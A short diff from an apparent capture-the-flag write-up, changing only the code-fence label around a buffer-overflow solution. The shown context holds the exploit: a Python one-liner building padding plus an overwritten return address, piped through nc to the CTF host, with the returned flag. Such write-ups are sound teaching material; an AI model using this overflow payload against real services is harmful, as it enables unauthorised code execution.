@@ -392,7 +392,7 @@ Payload : ```python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200'```
 Command : ```$ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200' | nc asgama.web.id 40211```
 
 Result : 
-```
+```bash
 $ python -c 'print "A"*52 + "\xc2\x91\x04\x08" + "A"*200' | nc asgama.web.id 40211
 GamaCTF{Ini_Bukan_Flagnya}
 ```
